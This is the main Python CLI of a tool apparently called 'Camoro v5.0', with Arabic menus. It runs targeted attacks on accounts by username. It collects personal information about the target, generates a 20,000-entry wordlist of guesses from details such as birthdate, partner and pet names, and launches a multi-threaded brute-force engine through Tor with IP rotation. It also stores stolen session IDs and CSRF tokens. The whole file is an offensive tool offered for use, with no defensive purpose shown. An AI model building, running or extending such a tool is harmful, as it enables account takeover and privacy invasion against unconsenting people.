#!/usr/bin/env python3
"""Camoro v5.0 - Main CLI"""

import json
import os
import signal
import sys
import time
from pathlib import Path

BASE_DIR = Path(__file__).parent.resolve()
sys.path.insert(0, str(BASE_DIR))

RESULTS_DIR = BASE_DIR / "results"
RESULTS_DIR.mkdir(exist_ok=True)
(BASE_DIR / "sessions").mkdir(exist_ok=True)
(BASE_DIR / "modules").mkdir(exist_ok=True)

from modules.info_gather import InfoGatherer
from modules.password_gen import PasswordGenerator
from modules.brute_force import BruteForceEngine
from modules.proxy_manager import ProxyManager
from modules.session_manager import SessionManager


class C:
    R = "\033[0;31m"
    G = "\033[0;32m"
    Y = "\033[1;33m"
    P = "\033[0;35m"
    C = "\033[0;36m"
    W = "\033[1;37m"
    N = "\033[0m"


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def banner():
    clear()
    print(f"""{C.P}
╔══════════════════════════════════════════════════╗
║           CAMORO v5.0  —  Framework              ║
╚══════════════════════════════════════════════════╝{C.N}
""")


def pause():
    input(f"\n{C.Y}[*] Enter للعودة...{C.N}")


def mode_intel():
    banner()
    u = input(f"{C.Y}username: {C.N}").strip().lstrip("@")
    if not u:
        return
    g = InfoGatherer(u, proxy_manager=ProxyManager())
    info = g.gather()
    if info and info.get("exists"):
        g.save()
        g.display()
        for k, label in [
            ("real_name", "الاسم الحقيقي"),
            ("birthdate", "الميلاد YYYY-MM-DD"),
            ("city", "المدينة"),
            ("partner_name", "الشريك"),
            ("pet_name", "حيوان"),
            ("keyword", "كلمة مفتاحية"),
        ]:
            v = input(f"  {label}: ").strip()
            if v:
                info[k] = v
        g.info = info
        g.save()
    else:
        print(f"{C.R}فشل{C.N}")
    pause()


def mode_gen():
    banner()
    u = input(f"{C.Y}username: {C.N}").strip().lstrip("@")
    path = RESULTS_DIR / u / "info.json"
    if not path.exists():
        print("استخدم الخيار 1 أولاً")
        pause()
        return
    info = json.loads(path.read_text(encoding="utf-8"))
    gen = PasswordGenerator(u, info)
    pw = gen.generate(20000)
    gen.save(pw)
    print(f"{C.G}تم {len(pw):,} كلمة{C.N}")
    for x in pw[:12]:
        print(" •", x)
    pause()


def mode_attack():
    banner()
    u = input(f"{C.Y}username: {C.N}").strip().lstrip("@")
    if not (RESULTS_DIR / u / "passwords.txt").exists():
        print("استخدم الخيار 2 أولاً")
        pause()
        return
    if input("اكتب YES: ").strip() != "YES":
        return
    eng = BruteForceEngine(u, proxy_manager=ProxyManager(), threads=5, rotate_every=3)
    eng.run()
    pause()


def mode_full():
    banner()
    u = input(f"{C.Y}username: {C.N}").strip().lstrip("@")
    if not u:
        return
    g = InfoGatherer(u, proxy_manager=ProxyManager())
    info = g.gather()
    if not info or not info.get("exists"):
        print("فشل الجمع")
        pause()
        return
    g.save()
    g.display()
    for k, label in [("real_name", "الاسم"), ("birthdate", "الميلاد"), ("city", "المدينة"), ("keyword", "كلمة")]:
        v = input(f"  {label}: ").strip()
        if v:
            info[k] = v
    g.info = info
    g.save()
    gen = PasswordGenerator(u, info)
    pw = gen.generate(20000)
    gen.save(pw)
    if input("بدء الهجوم YES: ").strip() == "YES":
        BruteForceEngine(u, proxy_manager=ProxyManager()).run()
    pause()


def mode_results():
    banner()
    dirs = [d for d in RESULTS_DIR.iterdir() if d.is_dir()] if RESULTS_DIR.exists() else []
    if not dirs:
        print("لا نتائج")
        pause()
        return
    for d in dirs:
        ok = (d / "success.txt").exists()
        print(f" • {d.name} | {'SUCCESS' if ok else 'PENDING'}")
        if ok:
            print((d / "success.txt").read_text(encoding="utf-8", errors="ignore"))
    pause()


def mode_proxy():
    banner()
    pm = ProxyManager()
    print("1 حالة  2 تغيير IP  3 اختبار  4 IP الحالي")
    ch = input("> ").strip()
    if ch == "1":
        print("Tor:", "ON" if pm.check_tor() else "OFF")
    elif ch == "2":
        print(pm.rotate_ip())
    elif ch == "3":
        print(pm.test_connection())
    elif ch == "4":
        print(pm.get_current_ip())
    pause()


def mode_session():
    banner()
    sm = SessionManager()
    print("1 حفظ 2 تحميل 3 عرض 4 حذف")
    ch = input("> ").strip()
    if ch == "1":
        sm.save(input("user: ").strip(), input("sid: ").strip(), input("csrf: ").strip())
        print("OK")
    elif ch == "2":
        print(sm.load(input("user: ").strip()))
    elif ch == "3":
        for s in sm.list_all():
            print("•", s.get("username"), s.get("created_at"))
    elif ch == "4":
        print(sm.delete(input("user: ").strip()))
    pause()


def main():
    signal.signal(signal.SIGINT, lambda s, f: (print("\nخروج"), sys.exit(0)))
    actions = {
        "1": mode_intel,
        "2": mode_gen,
        "3": mode_attack,
        "4": mode_full,
        "5": mode_results,
        "6": mode_proxy,
        "7": mode_session,
    }
    while True:
        banner()
        print("  [1] جمع معلومات")
        print("  [2] توليد كلمات مرور")
        print("  [3] هجوم")
        print("  [4] كامل")
        print("  [5] نتائج")
        print("  [6] Proxy")
        print("  [7] Sessions")
        print("  [0] خروج")
        ch = input(f"\n  {C.Y}اختيار: {C.N}").strip()
        if ch == "0":
            break
        actions.get(ch, lambda: print("خيار غلط"))()


if __name__ == "__main__":
    main()
